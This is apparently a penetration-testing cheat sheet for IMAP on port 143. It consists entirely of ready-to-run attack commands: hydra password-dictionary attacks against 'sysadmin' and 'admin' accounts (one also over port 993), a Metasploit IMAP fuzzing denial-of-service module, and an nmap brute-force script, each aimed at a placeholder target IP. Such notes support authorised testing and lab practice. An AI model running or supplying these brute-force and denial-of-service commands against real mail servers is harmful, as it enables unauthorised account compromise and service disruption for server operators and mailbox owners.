# 143 - IMAP

## Dictionary Attack 

    $ hydra -l sysadmin -P /usr/share/wordlists/metasploit/unix_passwords.txt [TARGET_IP] imap
    $ hydra -l admin -P /usr/share/wordlists/metasploit/unix_passwords.txt [TARGET_IP] imap
    $ hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f [TARGET_IP] imap -V

## Available Metasploit Options
Imap Vuln DoS Scan 

    use auxiliary/dos/windows/imap/fuzz_imap

## Nmap Brute Force 

    $ nmap -sV --script imap-brute -p 143 [TARGET_IP]
